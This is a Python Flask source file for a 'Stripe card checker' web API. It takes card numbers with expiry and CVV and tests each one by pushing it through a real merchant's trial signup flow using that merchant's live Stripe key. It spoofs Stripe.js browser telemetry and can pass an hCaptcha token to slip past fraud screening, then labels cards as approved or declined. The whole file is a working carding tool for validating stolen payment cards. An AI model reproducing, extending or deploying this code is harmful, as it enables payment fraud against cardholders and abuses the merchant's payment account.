# app.py
# Stripe card checker — URL-based API
# Usage: GET /check?cc=4111111111111111|12|25|123
# code by diwazz (modified for web)

import os
import re
import json
import random
import string
from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# ─────────────────────────────────────────────
# CONFIG — set these as Render env vars
# ─────────────────────────────────────────────
STRIPE_PK = os.environ.get(
    "STRIPE_PK",
    "pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq"
)
STRIPE_VERSION = os.environ.get("STRIPE_VERSION", "2025-03-31.basil")
SIGNUP_URL = "https://ezycourse.com/signup"
SETUP_INTENT_URL = "https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent"
HCAPTCHA_TOKEN = os.environ.get("HCAPTCHA_TOKEN", "")  # optional, may be required

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/150.0.0.0 Safari/537.36"
)


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def rand_hex(n: int) -> str:
    return "".join(random.choices("0123456789abcdef", k=n))


def rand_uuid_like() -> str:
    return "".join(
        random.choices("0123456789abcdef-", k=36)
    )


def parse_cc(raw: str):
    """
    Accepts: cc|mm|yy|cvv
    Returns (number, mm, yy, cvc) or None on bad input.
    """
    if not raw:
        return None
    parts = [p.strip() for p in raw.split("|")]
    if len(parts) != 4:
        return None
    number, mm, yy, cvc = parts
    number = re.sub(r"\D", "", number)
    mm = re.sub(r"\D", "", mm).zfill(2)
    yy = re.sub(r"\D", "", yy)
    cvc = re.sub(r"\D", "", cvc)
    if not (12 <= len(number) <= 19):
        return None
    if len(mm) != 2 or len(yy) not in (2, 4) or len(cvc) not in (3, 4):
        return None
    if len(yy) == 4:
        yy = yy[2:]
    return number, mm, yy, cvc


def luhn_ok(number: str) -> bool:
    digits = [int(d) for d in number][::-1]
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def brand_from_bin(number: str) -> str:
    b = number[:1]
    b2 = number[:2]
    if b == "4":
        return "Visa"
    if b2 in ("51", "52", "53", "54", "55") or number[:4] in (
        "2221", "2222", "2223", "2224", "2225", "2226", "2227", "2228", "2229",
        "223", "224", "225", "226", "227", "228", "229", "23", "24", "25", "26",
        "270", "271", "2720",
    ):
        return "Mastercard"
    if b2 in ("34", "37"):
        return "Amex"
    if b2 in ("60", "65") or number[:3] == "601":
        return "Discover"
    if b2 == "35":
        return "JCB"
    if number[:2] == "62":
        return "UnionPay"
    return "Unknown"


def fresh_session() -> requests.Session:
    """
    Create a requests session and hit the signup page
    so we get fresh XSRF-TOKEN + cookies (they rotate).
    """
    s = requests.Session()
    s.headers.update({
        "user-agent": UA,
        "accept-language": "en-US,en;q=0.9",
    })
    try:
        s.get(SIGNUP_URL, timeout=20)
    except Exception:
        pass
    return s


def get_xsrf(session: requests.Session) -> str:
    """
    Pull XSRF-TOKEN from the session cookies, url-decoded.
    Laravel stores it as e:<base64>.<sig> — pass it raw in header.
    """
    from urllib.parse import unquote
    tok = session.cookies.get("XSRF-TOKEN")
    if not tok:
        return ""
    return unquote(tok)


# ─────────────────────────────────────────────
# STRIPE FLOW
# ─────────────────────────────────────────────
def bin_metadata(session, number):
    """Optional BIN metadata lookup from Stripe."""
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": UA,
    }
    params = {
        "bin_prefix": number[:6],
        "key": STRIPE_PK,
        "_stripe_version": STRIPE_VERSION,
    }
    try:
        r = session.get(
            "https://api.stripe.com/edge-internal/card-metadata",
            params=params, headers=headers, timeout=20,
        )
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def create_payment_method(session, number, mm, yy, cvc):
    """POST /v1/payment_methods on Stripe. Returns (ok, data)."""
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": UA,
    }
    data = {
        "type": "card",
        "card[number]": number,
        "card[cvc]": cvc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": rand_hex(32),
        "muid": rand_hex(32),
        "sid": rand_hex(32),
        "payment_user_agent": "stripe.js/142f43c30d; stripe-js-v3/142f43c30d; card-element",
        "referrer": "https://ezycourse.com",
        "time_on_page": str(random.randint(30000, 180000)),
        "client_attribution_metadata[client_session_id]": rand_uuid_like(),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "client_attribution_metadata[wallet_config_id]": rand_uuid_like(),
        "key": STRIPE_PK,
        "_stripe_version": STRIPE_VERSION,
    }
    if HCAPTCHA_TOKEN:
        data["radar_options[hcaptcha_token]"] = HCAPTCHA_TOKEN

    try:
        r = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers, data=data, timeout=60,
        )
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"error": {"message": f"network: {e}"}}


def create_setup_intent(session, pm_id):
    """POST setup intent on ezycourse. Returns (status_code, json)."""
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://ezycourse.com",
        "referer": SIGNUP_URL + "?plan=pro&interval=month&trial=true",
        "user-agent": UA,
        "x-xsrf-token": get_xsrf(session),
    }
    payload = {
        "stripe_payment_method_uuid": pm_id,
        "is_trial": True,
    }
    try:
        r = session.post(
            SETUP_INTENT_URL,
            headers=headers, json=payload, timeout=60,
        )
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {"raw": r.text[:1000]}
    except Exception as e:
        return 0, {"error": {"message": f"network: {e}"}}


# ─────────────────────────────────────────────
# CLASSIFY RESULT
# ─────────────────────────────────────────────
def classify(pm_status, pm_data, si_status, si_data):
    """
    Turn raw Stripe/ezy responses into a clean verdict.
    Returns (status, response_text, code).
    """
    # Stripe payment_methods rejected the card outright
    if pm_status != 200:
        err = (pm_data or {}).get("error", {}) or {}
        msg = err.get("message", "Unknown error")
        code = err.get("code", "error")
        declined_codes = {
            "card_declined", "expired_card", "incorrect_cvc",
            "incorrect_number", "invalid_expiry_month",
            "invalid_expiry_year", "invalid_cvc", "invalid_number",
            "processing_error", "card_not_supported",
        }
        if code in declined_codes:
            return "DECLINED", msg, code
        return "ERROR", msg, code

    # Payment method created — now check setup intent
    if si_status == 200:
        # ezycourse often returns a message field; try a few shapes
        msg = (
            si_data.get("message")
            or si_data.get("status")
            or si_data.get("data", {}).get("status")
            or "Approved"
        )
        if isinstance(msg, str):
            ml = msg.lower()
            if "declin" in ml or "fail" in ml or "error" in ml:
                return "DECLINED", msg, si_data.get("code", "si_declined")
            return "APPROVED", msg, si_data.get("code", "si_approved")
        return "APPROVED", str(msg), "si_ok"

    # Setup intent failed
    err = (si_data or {}).get("error", {}) or {}
    msg = err.get("message") or si_data.get("message") or "Setup intent failed"
    code = err.get("code") or si_data.get("code") or "si_error"
    if "declin" in str(msg).lower():
        return "DECLINED", msg, code
    return "ERROR", msg, code


# ─────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────
@app.route("/", methods=["GET"])
def index():
    return jsonify({
        "name": "stripe-checker",
        "author": "diwazz",
        "usage": "/check?cc=number|mm|yy|cvv",
        "gateway": "Stripe",
    })


@app.route("/check", methods=["GET"])
def check():
    raw = request.args.get("cc", "")
    parsed = parse_cc(raw)
    if not parsed:
        return jsonify({
            "status": "ERROR",
            "gateway": "Stripe",
            "response": "Invalid input. Format: cc|mm|yy|cvv",
            "card": raw,
        }), 400

    number, mm, yy, cvc = parsed

    # Luhn sanity (Stripe will still be the real check)
    luhn = luhn_ok(number)
    brand = brand_from_bin(number)

    session = fresh_session()

    # Optional BIN info (doesn't gate the flow)
    bin_info = bin_metadata(session, number)

    # 1) Create Stripe payment method
    pm_status, pm_data = create_payment_method(session, number, mm, yy, cvc)
    pm_id = None
    if isinstance(pm_data, dict):
        pm_id = pm_data.get("id")

    # 2) If PM ok, create setup intent
    si_status, si_data = (0, {})
    if pm_status == 200 and pm_id:
        si_status, si_data = create_setup_intent(session, pm_id)

    status, response_text, code = classify(
        pm_status, pm_data, si_status, si_data
    )

    return jsonify({
        "status": status,
        "gateway": "Stripe",
        "response": response_text,
        "response_code": code,
        "card": f"{number}|{mm}|{yy}|{cvc}",
        "brand": brand,
        "luhn": luhn,
        "bin": {
            "prefix": number[:6],
            "country": (bin_info or {}).get("country"),
            "brand": (bin_info or {}).get("brand") or brand,
            "type": (bin_info or {}).get("funding"),
            "bank": (bin_info or {}).get("bank_name"),
        },
        "stripe_payment_method": pm_id,
        "raw": {
            "payment_methods": pm_data,
            "setup_intent": si_data,
        },
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
